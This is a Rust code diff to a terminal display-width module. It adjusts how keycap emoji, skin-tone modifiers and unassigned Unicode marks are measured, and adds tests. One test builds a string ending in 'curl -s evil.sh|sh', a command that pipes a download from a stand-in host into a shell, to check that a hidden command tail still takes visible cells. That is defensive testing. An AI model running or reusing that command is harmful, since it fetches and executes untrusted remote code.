@@ -1,3 +1,4 @@
+use unicode_properties::{GeneralCategory, UnicodeGeneralCategory};
 use unicode_segmentation::UnicodeSegmentation;
 use unicode_width::UnicodeWidthChar;
 
@@ -6,6 +7,7 @@ use crate::unicode_display_data::{RGI_EMOJI_SEQUENCES, VARIATION_BASES};
 const MAX_RGI_SEQUENCE_CODEPOINTS: usize = 10;
 const VARIATION_SELECTOR_15: char = '\u{fe0e}';
 const VARIATION_SELECTOR_16: char = '\u{fe0f}';
+const COMBINING_ENCLOSING_KEYCAP: char = '\u{20e3}';
 
 #[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
 pub struct DisplayUnit {
@@ -91,9 +93,9 @@ pub fn display_unit_at(text: &str, index: usize) -> DisplayUnit {
         };
     }
 
-    let may_start_keycap = matches!(first_byte, b'#' | b'*' | b'0'..=b'9')
-        && has_rgi_keycap_suffix(&text[index + 1..]);
-    if first_byte < 0x80 && !may_start_keycap {
+    let may_start_emoji =
+        matches!(first_byte, b'#' | b'*' | b'0'..=b'9') && has_emoji_suffix(&text[index + 1..]);
+    if first_byte < 0x80 && !may_start_emoji {
         let cell_width = usize::from(first_byte >= 0x20 && first_byte != 0x7f);
         return DisplayUnit {
             byte_len: 1,
@@ -139,9 +141,8 @@ pub fn display_unit_at(text: &str, index: usize) -> DisplayUnit {
     }
 }
 
-fn has_rgi_keycap_suffix(suffix: &str) -> bool {
-    let after_selector = suffix.strip_prefix(VARIATION_SELECTOR_16).unwrap_or(suffix);
-    after_selector.starts_with('\u{20e3}')
+fn has_emoji_suffix(suffix: &str) -> bool {
+    suffix.starts_with([VARIATION_SELECTOR_16, COMBINING_ENCLOSING_KEYCAP])
 }
 
 fn rune_width(codepoint: char) -> usize {
@@ -149,7 +150,7 @@ fn rune_width(codepoint: char) -> usize {
     if value < 0x20 || (0x7f..0xa0).contains(&value) {
         return 0;
     }
-    if is_zero_width_continuation(value) {
+    if is_zero_width_continuation(value) && !is_unassigned(codepoint) {
         return 0;
     }
     if is_double_width(codepoint) { 2 } else { 1 }
@@ -184,14 +185,17 @@ fn is_zero_width_continuation(value: u32) -> bool {
     is_combining(value)
         || matches!(
             value,
-            0x1f3fb..=0x1f3ff
-                | 0x200b..=0x200f
+            0x200b..=0x200f
                 | 0x202a..=0x202e
                 | 0x2060..=0x206f
                 | 0xfeff
                 | 0xe0001..=0xe007f
                 | 0xe0100..=0xe01ef
         )
+}
+
+fn is_unassigned(codepoint: char) -> bool {
+    codepoint.general_category() == GeneralCategory::Unassigned
 }
 
 fn is_variation_base(codepoint: char) -> bool {
@@ -347,6 +351,8 @@ mod tests {
     };
     use super::*;
 
+    const UNASSIGNED_ZERO_WIDTH_IN_UPSTREAM: usize = 68;
+
     fn in_upstream_ranges(codepoint: char, ranges: &[(char, char)]) -> bool {
         let index = ranges.partition_point(|&(_, last)| last < codepoint);
         ranges
@@ -409,8 +415,8 @@ mod tests {
     }
 
     #[test]
-    fn rune_widths_match_the_upstream_unicode_tables_for_every_scalar_value() {
-        let mismatches: Vec<(char, usize, usize)> = ('\0'..=char::MAX)
+    fn rune_widths_match_the_upstream_tables_except_for_lone_modifiers_and_unassigned_marks() {
+        let differences: Vec<(char, usize, usize)> = ('\0'..=char::MAX)
             .map(|codepoint| {
                 (
                     codepoint,
@@ -419,9 +425,51 @@ mod tests {
                 )
             })
             .filter(|&(_, ours, upstream)| ours != upstream)
-            .take(16)
             .collect();
-        assert!(mismatches.is_empty(), "{mismatches:?}");
+        let modifiers = differences
+            .iter()
+            .filter(|&&(codepoint, ours, upstream)| {
+                ('\u{1f3fb}'..='\u{1f3ff}').contains(&codepoint) && (ours, upstream) == (2, 0)
+            })
+            .count();
+        let unassigned = differences
+            .iter()
+            .filter(|&&(codepoint, ours, upstream)| {
+                is_unassigned(codepoint) && (ours, upstream) == (1, 0)
+            })
+            .count();
+        assert_eq!(
+            (modifiers, unassigned, differences.len()),
+            (
+                5,
+                UNASSIGNED_ZERO_WIDTH_IN_UPSTREAM,
+                5 + UNASSIGNED_ZERO_WIDTH_IN_UPSTREAM
+            ),
+            "{:?}",
+            differences.iter().take(16).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn lone_modifiers_ascii_emoji_presentation_and_unassigned_marks_take_cells() {
+        assert_eq!(visible_width("\u{1f3fd}"), 2);
+        assert_eq!(visible_width("a\u{1f3fd}"), 3);
+        assert_eq!(visible_width("\u{1f44d}\u{1f3fd}"), 2);
+        for base in ["#", "*", "0", "1", "9"] {
+            assert_eq!(visible_width(&format!("{base}\u{fe0f}")), 2, "{base}");
+            assert_eq!(
+                visible_width(&format!("{base}\u{fe0f}\u{20e3}")),
+                2,
+                "{base}"
+            );
+            assert_eq!(visible_width(&format!("{base}\u{fe0e}")), 1, "{base}");
+        }
+        assert_eq!(visible_width("\u{20ff}"), 1);
+        assert_eq!(visible_width("\u{1aff}"), 1);
+        assert_eq!(visible_width("\u{20dd}"), 0);
+        let hidden_tail = format!("echo {};curl -s evil.sh|sh", "\u{1f3fd}".repeat(40));
+        assert_eq!(visible_width(&hidden_tail), 5 + 80 + 19);
+        assert_eq!(visible_width(&"1\u{fe0f}".repeat(50)), 100);
     }
 
     #[test]
